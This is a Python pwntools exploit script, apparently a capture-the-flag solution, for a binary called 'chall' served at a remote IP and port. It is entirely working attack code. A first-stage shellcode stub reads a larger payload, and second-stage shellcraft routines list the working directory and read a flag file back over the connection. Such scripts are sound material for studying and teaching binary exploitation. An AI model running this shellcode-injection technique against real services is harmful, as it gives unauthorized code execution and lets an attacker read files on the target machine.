#!/usr/bin/python 

from pwn import *

# Pass the nc hostname port
CONN = "nc 103.152.242.235 11101".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

def start(argv=[], *a, **kw):
    if args.GDB:  
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  
        return remote(HOST, PORT, *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def getdents():
    AT_FDCWD = -100
    payload = shellcraft.openat(AT_FDCWD, "./",0)
    payload += shellcraft.getdents64("rax", "rsp", 0x100)
    payload += shellcraft.write(1, "rsp", 0x100)
    return b"\x90"*10 + asm(payload)

def flag():
    filename = "./flag-6217218e652c87dbdeda982333bacbe0.txt"
    payload = shellcraft.openat(-100, filename, 0)
    payload += shellcraft.read("rax", "rsp", 0x100)
    payload += shellcraft.write(1, "rsp", 0x100)
    return b"\x90"*10 + asm(payload)

def exploit(io):
    
    # First phase bigger read
    payload = asm('''
        lea rsi, [rip]
        dec edx
        syscall
    '''
    )
    
    # Send the payload
    sa(b":", payload)

    sleep(2)
    # Second phase
    #payload = getdents()
    payload = flag()
    se(payload)

    # Got Shell?
    io.interactive()

# ===========================================================
#                           SETUP
# ===========================================================

if __name__ == "__main__":
    
    # Specify GDB script here (breakpoints etc)
    gdbscript = """
    break *main+162
    c
    si 15
    """.format(
        **locals()
    )
    
    # Binary filename
    exe = "./chall"
    
    # This will automatically get context arch, bits, os etc
    elf = context.binary = ELF(exe, checksec=False)
    rop = ROP(elf)
    
    # Change logging level to help with debugging (error/warning/info/debug)
    context.terminal = "tmux splitw -h".split(" ")
    context.log_level = "debug"
    
    # Lib-C library, can use pwninit/patchelf to patch binary
    libc = elf.libc
    ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)
    
    if args.REMOTE:
        pass
        # libc = ELF("libc.so.6", checksec=False)
        # ld = ELF("ld-linux-x86-64.so.2", checksec=False)
    
    io = start()

    exploit(io)
